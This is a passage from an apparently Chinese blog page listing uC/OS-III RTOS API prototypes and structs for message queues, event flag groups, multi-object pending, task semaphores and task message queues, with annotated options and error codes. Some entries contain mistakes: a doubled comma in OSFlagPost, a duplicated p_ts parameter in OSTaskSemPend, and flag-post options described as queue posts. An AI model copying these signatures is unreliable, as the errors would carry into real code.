OS_MSG_SIZE *p_msg_size,  <span class="comment">// 消息大小（单位：字节）。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中止任务对一个消息队列的等待。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 只中止该消息队列等待列表中的最高优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL 中止该消息队列等待列表中的所有优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 |OS_OPT_POST_NO_SCHED只中止该消息队列等待列表中的最高优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL |OS_OPT_POST_NO_SCHED中止该消息队列等待列表中的所有优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_q 不是消息队列类型。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_NONE 没有任务在等待该消息队列。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该信号量，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，被中止的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSQPendAbort</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_Q *p_q,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除一个消息队列。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_NO_PEND 如果没有任务等待p_q，才删除p_q。</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_ALWAYS 必须删除p_q。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误。</span></span><br><span class="line"><span class="comment">OS_ERR_DEL_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_q 不是消息队列类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_WAITING 还有任务在等待该消息队列。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该消息队列，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，消息队列被删除前等待其的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSQDel</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_Q *p_q,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">清空一个消息队列（的消息）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，执行成功。</span></span><br><span class="line"><span class="comment">OS_ERR_FLUSH_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_q 不是消息队列类型。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">清空消息队列前队列里的消息数目。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_MSG_QTY <span class="title">OSQFlush</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_Q *p_q,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">os_q</span> &#123;</span><br><span class="line">    OS_OBJ_TYPE          Type; </span><br><span class="line">    CPU_CHAR            *NamePtr;</span><br><span class="line">    OS_PEND_LIST         PendList;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_DBG_EN &gt; 0u</span></span><br><span class="line">    OS_Q                *DbgPrevPtr;</span><br><span class="line">    OS_Q                *DbgNextPtr;</span><br><span class="line">    CPU_CHAR            *DbgNamePtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    OS_MSG_Q             MsgQ; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="事件标志组"><a href="#事件标志组" class="headerlink" title="事件标志组"></a>事件标志组</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个事件标志组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，创建成功。</span></span><br><span class="line"><span class="comment">OS_ERR_CREATE_ISR 在中断中调用该函数</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 在调用OSSafetyCriticalStart() 函数后创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_NAME p_name 为空指针</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_CREATED 该事件标志组已经被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 是个空指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSFlagCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAG_GRP *p_grp,  <span class="comment">// 事件标志组指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name,    <span class="comment">// 事件标志组名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAGS flags,      <span class="comment">// 事件标志初始值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">发布一个事件标志组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FLAG_SET 把选定的标志位置1。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FLAG_CLR 把选定的标志位清0。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FLAG_SET |OS_OPT_POST_NO_SCHED 把消息发布到队列的末端，并且唤醒全部等待任务；不进行任务调度，继续运行当前任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FLAG_CLR |OS_OPT_POST_NO_SCHED 把消息发布到队列的前端，并且唤醒全部等待任务；不进行任务调度，继续运行当前任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 调用成功。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_grp 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_grp 不是事件标志组类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">事件标志组的标志值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_FLAGS <span class="title">OSFlagPost</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAG_GRP *p_grp,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAGS flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等待一个事件标志组的事件组合发生。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ALL 等待flags 指定位均被清0。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ANY 等待flags 指定位有一位被清0 即可。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ALL 等待flags 指定位均被置1。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ANY 等待flags 指定位有一位被置1 即可。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ALL |OS_OPT_PEND_FLAG_CONSUME 等待flags 指定位均被清0；等到后把触发位取反。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ANY |OS_OPT_PEND_FLAG_CONSUME 等待flags 指定位有一位被清0 即可；等到后把触发位取反。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ALL |OS_OPT_PEND_FLAG_CONSUME等待flags 指定位均被置1；等到后把触发位取反。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ANY |OS_OPT_PEND_FLAG_CONSUME等待flags 指定位有一位被置1 即可；等到后把触发位取反。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ALL |OS_OPT_PEND_NON_BLOCKING要求flags 指定位均被清0；不符合要求不等待。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ANY |OS_OPT_PEND_NON_BLOCKING要求flags 指定位有一位被清0；不符合要求不等待。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ALL |OS_OPT_PEND_NON_BLOCKING要求flags 指定位均被置1；不符合要求不等待。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ANY |OS_OPT_PEND_NON_BLOCKING要求flags 指定位有一位被置1；不符合要求不等待。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ALL |OS_OPT_PEND_FLAG_CONSUME |OS_OPT_PEND_NON_BLOCKING要求flags 指定位均被清0；符合要求就把触发位取反；不符合要求不等待；。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_CLR_ANY |OS_OPT_PEND_FLAG_CONSUME |OS_OPT_PEND_NON_BLOCKING要求flags 指定位有一位被清0；符合要求就把触发位取反；不符合要求不等待；。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ALL |OS_OPT_PEND_FLAG_CONSUME |OS_OPT_PEND_NON_BLOCKING要求flags 指定位均被置1；符合要求就把触发位取反；不符合要求不等待；。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_FLAG_SET_ANY |OS_OPT_PEND_FLAG_CONSUME |OS_OPT_PEND_NON_BLOCKING要求flags 指定位有一位被置1；符合要求就把触发位取反；不符合要求不等待；。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 等待成功，指定事件组合发生。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_grp 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_grp 不是事件标志组类型对象。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT 等待被中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ISR 在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_WOULD_BLOCK 缺乏堵塞。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_TIMEOUT 等待超时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">!= (void *)0，任务脱离等待时的事件标志组的标志成员值。</span></span><br><span class="line"><span class="comment">== (void *)0，有错误，或者等待超时。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_FLAGS <span class="title">OSFlagPend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAG_GRP *p_grp,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAGS flags,     <span class="comment">// 要等待的事件（位）的组合</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中止任务对一个事件标志组的等待。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 只中止该事件标志组等待列表中的最高优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL 中止该事件标志组等待列表中的所有优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 |OS_OPT_POST_NO_SCHED只中止该事件标志组等待列表中的最高优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL |OS_OPT_POST_NO_SCHED中止该事件标志组等待列表中的所有优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_grp 为空</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_grp 不是事件标志组类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_NONE 没有任务在等待该事件标志组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该事件标志组，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，被中止的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSFlagPendAbort</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAG_GRP *p_grp,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除一个事件标志组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_NO_PEND 如果没有任务等待p_grp，才删除p_grp。</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_ALWAYS 必须删除p_grp。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误。</span></span><br><span class="line"><span class="comment">OS_ERR_DEL_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_grp 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_grp 不是事件标志组类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_WAITING 还有任务在等待该事件标志组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回</span></span><br><span class="line"><span class="comment">0，没有任务在等待该事件标志组，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，事件标志组被删除前等待其的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSFlagDel</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_FLAG_GRP *p_grp,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">os_flag_grp</span> &#123; </span><br><span class="line">    OS_OBJ_TYPE          Type; </span><br><span class="line">    CPU_CHAR            *NamePtr;  </span><br><span class="line">    OS_PEND_LIST         PendList; </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_DBG_EN &gt; 0u</span></span><br><span class="line">    OS_FLAG_GRP         *DbgPrevPtr;</span><br><span class="line">    OS_FLAG_GRP         *DbgNextPtr;</span><br><span class="line">    CPU_CHAR            *DbgNamePtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    OS_FLAGS             Flags; </span><br><span class="line">    CPU_TS               TS;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="等待多个内核对象"><a href="#等待多个内核对象" class="headerlink" title="等待多个内核对象"></a>等待多个内核对象</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等待多个内核对象（多值信号量或消息队列）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_BLOCKING 如果目前没有对象已被发布，阻塞任务，等待对象被发布。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_NON_BLOCKING 如果目前没有对象已被发布，不阻塞任务。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSPendMulti</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_PEND_DATA *p_pend_data_tbl,  <span class="comment">// 要等待的内核对象，等待两个或以上对象时一般为数组。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OBJ_QTY tbl_size,  <span class="comment">// 等待对象的数目。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">os_pend_data</span> &#123;</span><br><span class="line">    OS_PEND_DATA        *PrevPtr;</span><br><span class="line">    OS_PEND_DATA        *NextPtr;</span><br><span class="line">    OS_TCB              *TCBPtr;</span><br><span class="line">    OS_PEND_OBJ         *PendObjPtr;</span><br><span class="line">    OS_PEND_OBJ         *RdyObjPtr;</span><br><span class="line">    <span class="type">void</span>                *RdyMsgPtr;</span><br><span class="line">    OS_MSG_SIZE          RdyMsgSize;</span><br><span class="line">    CPU_TS               RdyTS;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="任务信号量"><a href="#任务信号量" class="headerlink" title="任务信号量"></a>任务信号量</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">给一个任务发布任务信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NONE 没有选项。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NO_SCHED 不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_SEM_OVF 该发布将导致了信号量的计数值溢出。</span></span><br><span class="line"><span class="comment">OS_ERR_STATE_INVALID 任务状态非法。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，有错误。</span></span><br><span class="line"><span class="comment">其他值，任务信号量的当前计数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_SEM_CTR <span class="title">OSTaskSemPost</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,    <span class="comment">// 目标任务控制块。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等待任务信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_BLOCKING 如果不能立即获得信号量，就堵塞当前任务，继续等待信号量。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_NON_BLOCKING 如果不能立即获得信号量，不堵塞当前任务，不继续等待信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误，成功获得信号量。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT 等待被另一个任务中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ISR 在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_WOULD_BLOCK 缺乏堵塞。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_STATUS_INVALID 等待状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TIMEOUT 等待超时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，信号量的当前计数值为0，或有错误。</span></span><br><span class="line"><span class="comment">其他值，信号量的当前计数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_SEM_CTR <span class="title">OSTaskSemPend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中止一个任务对其任务信号量的等待。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NONE 没有选项。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NO_SCHED 不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误，成功中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_NONE 目标任务并未在等待任务信号量。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_SELF 目标任务是自身。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">== DEF_FALSE&gt;0，目标任务没在等待任务信号量，或者有错误。</span></span><br><span class="line"><span class="comment">== DEF_TRUE，目标任务确实在等待任务信号量，而且等待成功被中止。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">目标任务不可以是自身（当前运行任务）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_BOOLEAN <span class="title">OSTaskSemPendAbort</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="任务消息队列"><a href="#任务消息队列" class="headerlink" title="任务消息队列"></a>任务消息队列</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">向任务消息队列发布一个消息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FIFO 把消息发布到队列的入口端。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_LIFO 把消息发布到队列的出口端。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FIFO |OS_OPT_POST_NO_SCHED把消息发布到队列的入口端；不进行任务调度，继续运行当前任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_LIFO |OS_OPT_POST_NO_SCHED把消息发布到队列的出口端；不进行任务调度，继续运行当前任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，消息成功被发布了。</span></span><br><span class="line"><span class="comment">OS_ERR_Q_MAX 任务消息队列已满。</span></span><br><span class="line"><span class="comment">OS_ERR_MSG_POOL_EMPTY 消息池没可用消息。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskQPost</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,   <span class="comment">// 目标任务。如果该参数为NULL，消息将发送给当前运行任务。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_void,    <span class="comment">// 消息指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MSG_SIZE msg_size,  <span class="comment">// 消息长度。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等待任务消息队列的消息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_BLOCKING 如果不能立即获得消息，就堵塞当前任务，继续等待消息。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_NON_BLOCKING 如果不能立即获得消息，不堵塞当前任务，不继续等待消息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误，任务成功获得消息。</span></span><br><span class="line"><span class="comment">OS_ERR_PTR_INVALID p_msg_size 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT 等待被中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ISR 在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_WOULD_BLOCK 缺乏堵塞。</span></span><br><span class="line"><span class="comment">OS_ERR_Q_EMPTY 任务消息队列里没有消息</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_TIMEOUT 等待超时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">!= NULL，接收到的消息的指针（首地址）。</span></span><br><span class="line"><span class="comment">== NULL，接收到一个空消息，或者有错误。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">OSTaskQPend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MSG_SIZE *p_msg_size,   